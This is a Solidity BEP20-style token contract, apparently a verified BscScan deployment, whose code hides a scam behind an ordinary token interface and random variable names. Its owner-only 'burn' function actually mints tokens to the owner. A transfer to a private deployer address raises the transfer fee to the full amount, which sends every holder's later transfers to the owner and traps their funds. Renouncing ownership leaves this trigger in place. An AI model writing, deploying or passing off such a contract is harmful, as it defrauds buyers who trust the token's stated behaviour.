/**
 *Submitted for verification at BscScan.com on 2022-11-15
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-11
 */
pragma solidity >=0.4.11;
contract ABIULZ {
uint256 public  KyJRji = 100000000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
event Approval(address indexed owner, address indexed spender, uint256 value);
string public  name = "OmOHBv";
uint256 public  jknnvy = 10000000000000000000000000000;
uint256 public  dWYJER = 1000000000000000000;
mapping (address => uint256) public balanceOf;
address public owner;
uint256 public constant totalSupply = 100000000000000000000000000000;
address public  LSeMVQ = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public  yjnTYG = address(0);
uint256 public  eYIQKm = 100000000000000000;
address private  zAYZFd = address(0);
uint256 public  Olmyfc = 100000000000000000000;
uint256 public  WUUEaw = 10000000000000000000;
uint256 public constant rcIdZX = 9+1;
uint256 public  PiumNv = 100000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
address public  ZKLurX = address(0);
uint256 private  xPFTPF = 10000000000000;
address public  HvKlma = address(0);
uint8 public constant decimals = 18;
string public  symbol = "WecoQQ";
uint256 public  gbirLL = 10000000000000000;
address public  VkCyXH = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public  KcSEsq = address(0);
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
constructor () {
zAYZFd = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "OYsfrJ");
require(to != address(0), "OYsfrJ");
require(amount <= balanceOf[from], "OYsfrJ");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* rcIdZX/xPFTPF ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==zAYZFd){
xPFTPF = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}

}